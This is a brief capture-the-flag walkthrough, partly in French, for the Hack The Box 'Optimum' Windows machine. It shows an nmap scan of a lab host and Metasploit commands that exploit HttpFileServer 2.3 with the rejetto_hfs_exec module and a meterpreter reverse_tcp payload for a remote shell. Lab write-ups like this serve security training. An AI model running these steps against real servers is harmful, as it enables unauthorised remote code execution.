# Optimum [Windows] Easy

[https://app.hackthebox.com/machines/6](https://app.hackthebox.com/machines/6)

**— 1. Enumeration —**

```perl
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.10.8  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-01 18:22 EDT
Nmap scan report for 10.10.10.8
Host is up (0.017s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![Untitled](Optimum%20%5BWindows%5D%20Easy%206b145cd337874f22a76f8f34e200cee0/Untitled.png)

**— 2. MetaSploit —**

`search rejetto`

`use windows/http/rejetto_hfs_exec`

`set LHOST RHOST SRVHOST` SRVHOST est votre IP

`set payload windows/x64/meterpreter/reverse_tcp`

`run`

blob:[https://app.hackthebox.com/208b586e-8f67-46f8-9e5f-2b91f382ff03](https://app.hackthebox.com/208b586e-8f67-46f8-9e5f-2b91f382ff03)